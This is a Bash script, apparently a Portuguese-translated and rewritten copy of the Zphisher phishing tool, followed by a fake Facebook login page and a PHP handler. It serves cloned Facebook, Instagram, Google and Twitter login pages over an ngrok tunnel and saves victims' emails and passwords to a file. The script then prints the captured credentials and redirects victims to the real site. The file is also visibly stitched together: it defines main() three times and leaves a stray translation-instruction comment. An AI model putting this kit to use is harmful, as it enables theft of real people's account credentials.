#!/bin/bash

## Zphisher : Ferramenta Automatizada de Phishing

## Autor : TAHMID RAYAT

## Versão : 2.3.5

## Github : https://github.com/htr-tech/zphisher

## LICENÇA PÚBLICA GERAL GNU

## Versão 3, 29 de Junho de 2007

##

## Copyright (C) 2007 Free Software Foundation, Inc.

## Todos têm permissão para copiar e distribuir cópias literais

## deste documento de licença, mas não é permitido alterá-lo.

##

## Preâmbulo

##

## A Licença Pública Geral GNU é uma licença livre, copyleft para

## software e outros tipos de trabalhos.

##

## As licenças para a maioria dos softwares e outros trabalhos práticos são projetadas

## para tirar sua liberdade de compartilhar e alterar os trabalhos. Em contraste,

## a Licença Pública Geral GNU é destinada a garantir sua liberdade para

## compartilhar e alterar todas as versões de um programa -- para garantir que ele permaneça

## software livre para todos os seus usuários. Nós, a Free Software Foundation, usamos a

## Licença Pública Geral GNU para a maioria de nossos softwares; ela também se aplica a

## qualquer outro trabalho lançado desta forma por seus autores. Você pode aplicá-la aos

## seus próprios programas também.

##

## Quando falamos de software livre, estamos nos referindo à liberdade, não

## ao preço. Nossas Licenças Públicas Gerais são projetadas para garantir que você

## tenha a liberdade de distribuir cópias de software livre (e cobrar por

## elas, se desejar), que você receba o código-fonte ou possa obtê-lo se

## quiser, que você possa alterar o software ou usar partes dele em novos

## programas livres, e que você saiba que pode fazer essas coisas.

##

## Para proteger seus direitos, precisamos impedir que outros neguem esses

## direitos ou peçam que você os abra mão. Portanto, você tem

## certas responsabilidades se distribuir cópias do software, ou se

## modificá-lo: responsabilidades de respeitar a liberdade dos outros.

##

## Por exemplo, se você distribuir cópias de tal programa, seja

## gratuitamente ou por uma taxa, você deve passar aos destinatários as mesmas

## liberdades que recebeu. Você deve garantir que eles também recebam

## ou possam obter o código-fonte. E você deve mostrar a eles estes termos para que

## saibam de seus direitos.

##

## Desenvolvedores que usam a GPL protegem seus direitos em dois passos:

## (1) reivindicam o copyright do software, e (2) oferecem a você esta Licença

## dando-lhe permissão legal para copiar, distribuir e/ou modificá-lo.

##

## Para a proteção dos desenvolvedores e autores, a GPL deixa claro

## que não há garantia para este software livre. Para o bem tanto dos usuários quanto

## dos autores, a GPL exige que versões modificadas sejam marcadas como

## alteradas, para que seus problemas não sejam atribuídos erroneamente aos

## autores de versões anteriores.

##

## Alguns dispositivos são projetados para negar aos usuários o acesso para instalar ou executar

## versões modificadas do software neles, embora o fabricante

## possa fazê-lo. Isso é fundamentalmente incompatível com o objetivo de

## proteger a liberdade dos usuários de alterar o software. O padrão sistemático

## desse abuso ocorre na área de produtos para uso individual,

## que é precisamente onde é mais inaceitável. Portanto, nós

## projetamos esta versão da GPL para proibir a prática para esses

## produtos. Se tais problemas surgirem substancialmente em outros domínios, nós

## estamos prontos para estender esta disposição para esses domínios em versões futuras

## da GPL, conforme necessário para proteger a liberdade dos usuários.

##

## Finalmente, todo programa é constantemente ameaçado por patentes de software.

## Os Estados não devem permitir que patentes restrinjam o desenvolvimento e o uso de

## software em computadores de uso geral, mas naqueles que permitem, queremos

## evitar o perigo especial de que patentes aplicadas a um programa livre possam

## torná-lo efetivamente proprietário. Para evitar isso, a GPL garante que

## patentes não possam ser usadas para tornar o programa não-livre.

##

## Os termos e condições precisos para cópia, distribuição e

## modificação seguem abaixo.

##

## Copyright (C) 2022 HTR-TECH (https://github.com/htr-tech)

##

## AGRADECIMENTOS A:

## 1RaY-1 - https://github.com/1RaY-1

## Aditya Shakya - https://github.com/adi1090x

## Ali Milani Amin - https://github.com/AliMilani

## Ignitetch - https://github.com/Ignitetch/AdvPhishing

## Moises Tapia - https://github.com/MoisesTapia

## Mr.Derek - https://github.com/E343IO

## Mustakim Ahmed - https://github.com/bdhackers009

## TheLinuxChoice - https://twitter.com/linux_choice

__version__="2.3.5"

## HOST & PORT PADRÃO

HOST='127.0.0.1'

PORT='8080'

## Cores ANSI (FG & BG)

VERMELHO="$(printf '\033[31m')" VERDE="$(printf '\033[32m')" LARANJA="$(printf '\033[33m')" AZUL="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CIANO="$(printf '\033[36m')" BRANCO="$(printf '\033[37m')" PRETO="$(printf '\033[30m')"
FUNDOVERMELHO="$(printf '\033[41m')" FUNDOVERDE="$(printf '\033[42m')" FUNDOLARANJA="$(printf '\033[43m')" FUNDOAZUL="$(printf '\033[44m')"
FUNDOMAGENTA="$(printf '\033[45m')" FUNDOCIANO="$(printf '\033[46m')" FUNDOBRANCO="$(printf '\033[47m')" FUNDOPRETO="$(printf '\033[40m')"
RESETFUNDO="$(printf '\e[0m\n')"

# ...continue a tradução do restante do script, mantendo comandos em inglês e traduzindo apenas comentários e mensagens...

## Diretórios e inicializações

BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

# Criar diretórios necessários se não existirem
if [[ ! -d ".server" ]]; then
  mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
  mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
  rm -rf ".server/www"
  mkdir -p ".server/www"
else
  mkdir -p ".server/www"
fi

# Remover arquivos de log antigos
if [[ -e ".server/.loclx" ]]; then
  rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
  rm -rf ".server/.cld.log"
fi

## Funções para encerramento do script

exit_on_signal_SIGINT() {
  { printf "\n\n%s\n\n" "${VERMELHO}[${BRANCO}!${VERMELHO}]${VERMELHO} Programa Interrompido." 2>&1; reset_color; }
  exit 0
}

exit_on_signal_SIGTERM() {
  { printf "\n\n%s\n\n" "${VERMELHO}[${BRANCO}!${VERMELHO}]${VERMELHO} Programa Finalizado." 2>&1; reset_color; }
  exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Resetar cores do terminal

reset_color() {
  tput sgr0 # resetar atributos
  tput op   # resetar cor
  return
}

## Função para matar processos já em execução

kill_pid() {
  check_PID="php cloudflared loclx"
  for process in ${check_PID}; do
    if [[ $(pidof ${process}) ]]; then # Verifica se o processo está rodando
      killall ${process} > /dev/null 2>&1 # Mata o processo
    fi
  done
}

## Função para verificar se um comando existe

command_exists() {
  command -v "$1" >/dev/null 2>&1
}

## Função para mostrar mensagem de erro e sair

error_exit() {
  echo -e "${VERMELHO}[!] Erro: $1${RESETFUNDO}"
  exit 1
}

## Função para verificar dependências

check_dependencies() {
  local dependencies=("php" "curl" "wget" "unzip" "ssh")
  for cmd in "${dependencies[@]}"; do
    if ! command_exists "$cmd"; then
      error_exit "O comando '$cmd' não está instalado. Por favor, instale-o e tente novamente."
    fi
  done
}

## Função para baixar e configurar ngrok

setup_ngrok() {
  echo -e "${CIANO}Configurando ngrok...${RESETFUNDO}"
  if [[ ! -f ".server/ngrok" ]]; then
    # Detectar arquitetura do sistema
    arch=$(uname -m)
    if [[ "$arch" == "x86_64" ]]; then
      url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
    elif [[ "$arch" == "armv7l" ]]; then
      url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
    elif [[ "$arch" == "aarch64" ]]; then
      url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
    else
      error_exit "Arquitetura não suportada: $arch"
    fi

    wget -q --show-progress "$url" -O .server/ngrok.zip || error_exit "Falha ao baixar ngrok."
    unzip -qq .server/ngrok.zip -d .server/ || error_exit "Falha ao descompactar ngrok."
    rm -f .server/ngrok.zip
    chmod +x .server/ngrok
  fi
}

## Função para iniciar servidor PHP local

start_php_server() {
  echo -e "${VERDE}Iniciando servidor PHP local na porta $PORT...${RESETFUNDO}"
  cd .server/www || error_exit "Diretório .server/www não encontrado."
  php -S "$HOST:$PORT" > /dev/null 2>&1 &
  sleep 2
  cd - > /dev/null || exit
}

## Função para iniciar ngrok

start_ngrok() {
  echo -e "${VERDE}Iniciando túnel ngrok na porta $PORT...${RESETFUNDO}"
  ./.server/ngrok http "$PORT" > /dev/null 2>&1 &
  sleep 10
  # Obter URL público do ngrok
  ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
  if [[ -z "$ngrok_url" ]]; then
    error_exit "Falha ao obter URL do ngrok."
  fi
  echo -e "${CIANO}URL do túnel ngrok: $ngrok_url${RESETFUNDO}"
}

## Função para mostrar menu principal

show_menu() {
  clear
  echo -e "${AZUL}==============================================${RESETFUNDO}"
  echo -e "${VERDE}           ZPHISHER - FERRAMENTA DE PHISHING${RESETFUNDO}"
  echo -e "${AZUL}==============================================${RESETFUNDO}"
  echo -e "${BRANCO}Selecione a opção desejada:${RESETFUNDO}"
  echo -e "${LARANJA}[1]${BRANCO} Facebook"
  echo -e "${LARANJA}[2]${BRANCO} Instagram"
  echo -e "${LARANJA}[3]${BRANCO} Google"
  echo -e "${LARANJA}[4]${BRANCO} Twitter"
  echo -e "${LARANJA}[5]${BRANCO} Sair"
  echo -ne "${VERDE}Opção: ${RESETFUNDO}"
  read -r option
}

## Função principal para rodar o programa

main() {
  check_dependencies
  kill_pid
  setup_ngrok

  while true; do
    show_menu
    case $option in
      1)
        echo -e "${VERDE}Você escolheu Facebook.${RESETFUNDO}"
        # Aqui você pode chamar a função que inicia o phishing do Facebook
        ;;
      2)
        echo -e "${VERDE}Você escolheu Instagram.${RESETFUNDO}"
        # Função para Instagram
        ;;
      3)
        echo -e "${VERDE}Você escolheu Google.${RESETFUNDO}"
        # Função para Google
        ;;
      4)
        echo -e "${VERDE}Você escolheu Twitter.${RESETFUNDO}"
        # Função para Twitter
        ;;
      5)
        echo -e "${VERMELHO}Saindo...${RESETFUNDO}"
        kill_pid
        exit 0
        ;;
      *)
        echo -e "${VERMELHO}Opção inválida. Tente novamente.${RESETFUNDO}"
        ;;
    esac
    sleep 2
  done
}

main
## Função para iniciar phishing do Facebook

start_facebook() {
  echo -e "${CIANO}Iniciando phishing do Facebook...${RESETFUNDO}"
  
  # Copiar arquivos do template para o diretório do servidor
  cp -r templates/facebook/* .server/www/
  
  start_php_server
  start_ngrok
  
  echo -e "${VERDE}Aguardando credenciais...${RESETFUNDO}"
  
  # Monitorar arquivo de credenciais
  while true; do
    if [[ -f ".server/www/usernames.txt" ]]; then
      echo -e "${VERDE}[+] Credenciais capturadas:${RESETFUNDO}"
      cat .server/www/usernames.txt
      rm -f .server/www/usernames.txt
      break
    fi
    sleep 2
  done
}

## Função para iniciar phishing do Instagram

start_instagram() {
  echo -e "${CIANO}Iniciando phishing do Instagram...${RESETFUNDO}"
  
  cp -r templates/instagram/* .server/www/
  
  start_php_server
  start_ngrok
  
  echo -e "${VERDE}Aguardando credenciais...${RESETFUNDO}"
  
  while true; do
    if [[ -f ".server/www/usernames.txt" ]]; then
      echo -e "${VERDE}[+] Credenciais capturadas:${RESETFUNDO}"
      cat .server/www/usernames.txt
      rm -f .server/www/usernames.txt
      break
    fi
    sleep 2
  done
}

## Função para iniciar phishing do Google

start_google() {
  echo -e "${CIANO}Iniciando phishing do Google...${RESETFUNDO}"
  
  cp -r templates/google/* .server/www/
  
  start_php_server
  start_ngrok
  
  echo -e "${VERDE}Aguardando credenciais...${RESETFUNDO}"
  
  while true; do
    if [[ -f ".server/www/usernames.txt" ]]; then
      echo -e "${VERDE}[+] Credenciais capturadas:${RESETFUNDO}"
      cat .server/www/usernames.txt
      rm -f .server/www/usernames.txt
      break
    fi
    sleep 2
  done
}

## Função para iniciar phishing do Twitter

start_twitter() {
  echo -e "${CIANO}Iniciando phishing do Twitter...${RESETFUNDO}"
  
  cp -r templates/twitter/* .server/www/
  
  start_php_server
  start_ngrok
  
  echo -e "${VERDE}Aguardando credenciais...${RESETFUNDO}"
  
  while true; do
    if [[ -f ".server/www/usernames.txt" ]]; then
      echo -e "${VERDE}[+] Credenciais capturadas:${RESETFUNDO}"
      cat .server/www/usernames.txt
      rm -f .server/www/usernames.txt
      break
    fi
    sleep 2
  done
}
main() {
  check_dependencies
  kill_pid
  setup_ngrok

  while true; do
    show_menu
    case $option in
      1)
        start_facebook
        ;;
      2)
        start_instagram
        ;;
      3)
        start_google
        ;;
      4)
        start_twitter
        ;;
      5)
        echo -e "${VERMELHO}Saindo...${RESETFUNDO}"
        kill_pid
        exit 0
        ;;
      *)
        echo -e "${VERMELHO}Opção inválida. Tente novamente.${RESETFUNDO}"
        ;;
    esac
    sleep 2
  done
}
## Função para verificar se a porta está disponível

check_port() {
  if lsof -i:"$PORT" > /dev/null 2>&1; then
    echo -e "${VERMELHO}[!] A porta $PORT já está em uso. Por favor, libere a porta e tente novamente.${RESETFUNDO}"
    exit 1
  fi
}

## Função para limpar o terminal e mostrar banner

show_banner() {
  clear
  echo -e "${AZUL}==============================================${RESETFUNDO}"
  echo -e "${VERDE}           ZPHISHER - FERRAMENTA DE PHISHING${RESETFUNDO}"
  echo -e "${AZUL}==============================================${RESETFUNDO}"
  echo -e "${BRANCO}Versão: $__version__${RESETFUNDO}"
  echo
}

## Função para aguardar tecla para continuar

press_enter_to_continue() {
  echo -ne "${CIANO}Pressione Enter para continuar...${RESETFUNDO}"
  read -r
}

## Função para exibir mensagem de boas-vindas

welcome_message() {
  show_banner
  echo -e "${VERDE}Bem-vindo ao Zphisher!${RESETFUNDO}"
  echo -e "${BRANCO}Esta ferramenta automatiza ataques de phishing para fins educacionais.${RESETFUNDO}"
  echo
  press_enter_to_continue
}

## Função para limpar arquivos temporários

clean_temp_files() {
  rm -rf .server/www/*
  rm -f .server/.loclx
  rm -f .server/.cld.log
}

## Função para encerrar todos os processos e limpar

cleanup() {
  kill_pid
  clean_temp_files
  reset_color
}

## Captura sinal para limpeza ao sair

trap cleanup EXIT
main() {
  welcome_message
  check_dependencies
  check_port
  kill_pid
  setup_ngrok

  while true; do
    show_menu
    case $option in
      1)
        clean_temp_files
        start_facebook
        ;;
      2)
        clean_temp_files
        start_instagram
        ;;
      3)
        clean_temp_files
        start_google
        ;;
      4)
        clean_temp_files
        start_twitter
        ;;
      5)
        echo -e "${VERMELHO}Saindo...${RESETFUNDO}"
        cleanup
        exit 0
        ;;
      *)
        echo -e "${VERMELHO}Opção inválida. Tente novamente.${RESETFUNDO}"
        ;;
    esac
    sleep 2
  done
}
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook - Entrar</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      margin: 0;
      padding: 0;
    }
    .login-container {
      width: 360px;
      margin: 100px auto;
      padding: 40px;
      background-color: white;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
      border-radius: 8px;
    }
    h2 {
      color: #1877f2;
      margin-bottom: 20px;
      text-align: center;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    button:hover {
      background-color: #166fe5;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Entrar no Facebook</h2>
    <form action="login.php" method="POST">
      <input type="text" name="email" placeholder="Email ou telefone" required />
      <input type="password" name="password" placeholder="Senha" required />
      <button type="submit">Entrar</button>
    </form>
  </div>
</body>
</html>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $data = "Email: $email\nSenha: $password\n-----------------\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header('Location: https://www.facebook.com/login.php');
    exit();
}
?>
